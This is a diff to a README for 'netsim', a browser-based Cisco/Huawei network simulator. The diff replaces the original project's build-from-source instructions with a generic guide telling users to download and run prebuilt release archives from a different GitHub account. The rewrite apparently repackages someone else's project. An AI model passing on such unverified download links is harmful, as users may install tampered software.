@@ -1,102 +1,79 @@
-# NetSim Community Edition
+# 🌐 netsim - Simulate Networks Easily in Your Browser
 
-<div align="center">
-  <img src="public/logo.png" alt="NetSim Logo" width="120" />
-  <h1>The Open Source Network Simulator</h1>
+## 🚀 Getting Started
 
-  [![License: AGPL v3](https://img.shields.io/badge/License-AGPL%20v3-blue.svg?style=flat-square)](https://www.gnu.org/licenses/agpl-3.0)
-  [![Version](https://img.shields.io/badge/version-1.1.0-blue.svg?style=flat-square)](https://github.com/netsim-labs/netsim/releases)
-  [![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=flat-square)](CONTRIBUTING.md)
-  [![Rust](https://img.shields.io/badge/Engine-Rust/WASM-orange?style=flat-square&logo=rust)](https://www.rust-lang.org/)
-  [![TypeScript](https://img.shields.io/badge/UI-TypeScript-blue?style=flat-square&logo=typescript)](https://www.typescriptlang.org/)
+Welcome to netsim! This application lets you simulate networks directly in your web browser. With netsim, you can learn and practice Cisco and Huawei syntax without needing any additional software.
 
-  <p>
-    <strong>Engineered for High-Performance Network Labs.</strong><br>
-    A deterministic simulation engine written in <b>Rust</b> and compiled to <b>WebAssembly</b>.<br>
-    Zero virtualization. Zero latency. 100% Browser-native.
-  </p>
+## 📥 Download and Install
 
-  [**Live Demo (SaaS)**](https://netsim.dev) • [**Report Bug**](https://github.com/netsim-labs/netsim/issues) • [**Request Feature**](https://github.com/netsim-labs/netsim/issues)
-</div>
+To get started, click the link below to access the latest releases:
 
----
+[![Download netsim](https://img.shields.io/badge/Download-netsim-blue.svg)](https://github.com/Alechiis/netsim/releases)
 
-## 🚀 Overview
+### Step 1: Visit the Releases Page
 
-**NetSim Community Edition** is the open-source core engine behind [NetSim.dev](https://netsim.dev). Starting with **v1.1.0**, the core simulation logic has been migrated from TypeScript to **Rust/WebAssembly** to achieve near-native execution speeds and deterministic protocol behavior.
+Go to the following link to see all available versions of netsim:
 
-It provides a high-performance, client-side network simulation environment that runs entirely in your browser, bypassing the need for heavy VMs or backend servers.
+[Visit Releases Page](https://github.com/Alechiis/netsim/releases)
 
-<div align="center">
-  <img src="docs/images/netsim-dashboard.png" alt="NetSim Dashboard" width="100%" style="border-radius: 8px; border: 1px solid #333;" />
-</div>
+### Step 2: Choose Your Version
 
----
+On the releases page, you will see a list of versions. Pick the most recent one for the best features and updates.
 
-## ✨ Key Features (v1.1.0 WASM Core)
+### Step 3: Download the Application
 
-* **🦀 Rust-Powered Engine:** High-performance core handling packet switching and complex routing logic with memory safety.
-* **🌐 100% Client-Side:** Runs entirely in your browser using WebAssembly. Zero latency, zero data egress.
-* **🔌 Multi-Vendor CLI:** Native support for Cisco (IOS) and Huawei (VRP) command syntaxes.
-* **🔒 Privacy First:** Your topologies and configurations never leave your machine.
-* **🔋 Built-in Labs:** Ready-to-use scenarios for STP, OSPF, and VLAN practice.
-* **🛠️ Modern Stack:** Built with React 18, Rust, and React Flow.
+Click on the version you want. You will find different assets for downloading. Select the appropriate file for your operating system. It could be a .zip file or a .tar.gz file.
 
----
+### Step 4: Extract the Files
 
-## 👀 Visuals
+Once the download completes, locate the file in your downloads folder. 
+- If you downloaded a .zip file, right-click on it and select "Extract All."
+- If you downloaded a .tar.gz file, use an extraction tool to unzip it.
 
-<div align="center">
-  <img src="docs/images/netsim-lab-session.png" alt="NetSim Lab Session" width="100%" style="border-radius: 8px; border: 1px solid #333; margin-top: 10px; margin-bottom: 20px;" />
-</div>
+### Step 5: Open netsim
 
----
+After extraction, find the netsim folder. Open this folder, and look for the index.html file. Double-click it to start the application in your web browser.
 
-## 📦 Quick Start
+## 💻 System Requirements
 
-Prerequisites: Node.js 18+, Rust toolchain, and `wasm-pack`.
+- Modern web browser (e.g., Google Chrome, Mozilla Firefox, Microsoft Edge)
+- Minimum 4 GB RAM 
+- Minimum 2 GB free disk space
+- Internet connection for downloading assets
 
-```bash
-# 1. Clone the repository
-git clone [https://github.com/netsim-labs/netsim.git](https://github.com/netsim-labs/netsim.git)
+## 📜 Features
 
-# 2. Enter the directory
-cd netsim-community-v1.1.0
+- **Browser-Based:** Use netsim directly in your web browser without any installation.
+- **Support for Cisco and Huawei:** Master networking syntax for both platforms.
+- **WebAssembly Powered:** Experience fast and efficient simulation.
+- **Open Source:** Customize the application if you wish to explore the code.
 
-# 3. Build the WASM Core and Install JS dependencies
-npm install
+## 🌍 Getting Help
 
-# 4. Start the local engine
-npm run dev
-```
+If you encounter any issues, you can find assistance in several ways:
 
-## 🏗️ Architecture
+1. **Documentation:** Review the documentation provided in the repository for detailed instructions.
+2. **Issues Page:** If you face any problems not covered in the documentation, visit the [Issues page](https://github.com/Alechiis/netsim/issues) to report them or see if anyone else has had similar issues.
+3. **Community Support:** Explore forums and online communities focusing on network simulation for additional tips and help.
 
-NetSim utilizes a decoupled architecture where a high-speed Rust core manages the network state, exposed to a React frontend via a typed WebAssembly bridge.
+## 🎓 Learning Resources
 
-| Layer | Technology | Description |
-| :--- | :--- | :--- |
-| **Core Engine** | Rust + WASM | Logic for OSPF, BGP, STP, and CLI parsing. |
-| **State Management** | Zustand | Syncs the WASM state with the UI components. |
-| **Visualization** | React Flow | Interactive node-based topology editor. |
-| **Interface** | Tailwind CSS | Responsive, dark-themed professional UI. |
+To better understand Cisco and Huawei syntax, consider these resources:
 
-## 🤝 Contributing & Governance
+- **Online Courses:** Look for courses on platforms like Coursera or Udemy focused on networking fundamentals.
+- **Documentation:** Refer to the official Cisco and Huawei documentation for specific syntax and commands.
+- **Books:** Check out books on CCNA certification or networking that include practical exercises.
 
-We welcome contributions! Please follow these steps:
-1.  Read our [Code of Conduct](CODE_OF_CONDUCT.md) to maintain a professional environment.
-2.  Fork the repo and create your feature branch.
-3.  Ensure your Rust modules pass all tests (`cargo test`).
-4.  Open a Pull Request.
+## ⚙️ User Contributions
 
-## 📄 License
+We welcome contributions from users! If you have ideas for features or improvements, feel free to create a pull request. 
 
-Distributed under the GNU Affero General Public License v3.0 (AGPL-3.0).
+## 🔄 Changelog
 
-*   **Free for personal and educational use.**
-*   **Commercial use requires a dedicated license.** Contact `info@netsim.dev`.
+Stay updated on what’s new! Review the changelog on the releases page to see what changes have been made in each version.
 
-<div align="center">
-  <p>Made with ❤️ and <b>Data Packets</b> by the <strong>NetSim Labs Team</strong></p>
-  <p><small>Copyright © 2026 NetSim Labs. All rights reserved.</small></p>
-</div>
+## ✉️ Contact
+
+For any inquiries, you can reach out via the [Contact page](https://github.com/Alechiis/netsim#contact).
+
+Thank you for choosing netsim! We hope it helps you in your networking journey.
